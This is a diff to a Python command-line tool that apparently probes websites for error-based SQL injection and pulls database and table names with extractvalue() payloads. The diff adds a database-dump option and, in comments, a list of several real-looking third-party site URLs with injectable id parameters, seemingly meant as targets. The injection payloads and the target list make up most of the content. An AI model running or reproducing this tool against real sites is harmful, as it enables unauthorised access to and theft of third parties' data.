@@ -1,7 +1,13 @@
 import requests, argparse
 from bs4 import BeautifulSoup as BS
 
-def Main(test, get_database_type, dbname, tablenames):
+# http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-Extractvalue.html
+# https://www.architecturalpapers.ch/index.php?ID=4%27              
+# http://www.wurm.info/index.php?id=8%27                            
+# https://www.cityimmo.ch/reservations.php?lang=FR&todo=res&;id=22
+# http://www.meggieschneider.com/php/detail.php?id=48
+
+def Main(test, get_database_type, dbname, tablenames, dump):
     if args.test:
         urls = [args.test + "'", args.test + '"', args.test[:-4] + ';', args.test[:-4] + ")", args.test[:-4] + "')", args.test[:-4] + '")', args.test[:-4] + '*'] 
         vulnerable_text = ['MySQL Query fail:', '/www/htdocs/', 'Query failed', 'mysqli_fetch_array()', 'mysqli_result', 'Warning: ', 'MySQL server', 'SQL syntax', 'You have an error in your SQL syntax;', 'mssql_query()', "Incorrect syntax near '='", 'mssql_num_rows()', 'Notice: ']
@@ -18,6 +24,8 @@ def Main(test, get_database_type, dbname, tablenames):
                 print('Site is vulnerable!')
         except:
             print('Site is not vulnerable!')
+    elif args.dump:
+        print('Dumping the database')
     elif args.tablenames:
         print("Extracting tables names...")
         link = str(args.tablenames) + " and extractvalue(1,(select%20group_concat(table_name) from%20information_schema.tables where table_schema=database()))"
@@ -30,7 +38,7 @@ def Main(test, get_database_type, dbname, tablenames):
         str3 = str1[:str2]
         print("\nTable names: " + str3)
     elif args.dbname:
-        link = args.dbname + " and extractvalue(1,concat(1,(select database()))) --"
+        link = args.dbname + " and extractvalue(1,concat(1,(select database()))) --" # " and extractvalue(0x0a,concat(0x0a,(select database())))--"
         print(link)
         results = requests.get(link)
         data = results.text 
@@ -78,9 +86,11 @@ if __name__ == '__main__':
     ap.add_argument('-gdt', '--get_database_type', type=str, help='Find backend DB type')
     ap.add_argument('-dbn', '--dbname', type=str, help='Get database name')
     ap.add_argument('-tn', '--tablenames', type=str, help='Get table names')
+    ap.add_argument('-d', '--dump', type=str, help="Dump the Database")
     args = ap.parse_args()
     test = args.test
     dbname = args.dbname
     tablenames = args.tablenames
+    dump = args.dump
     get_database_type = args.get_database_type
-    Main(test, get_database_type, dbname, tablenames)
+    Main(test, get_database_type, dbname, tablenames, dump)
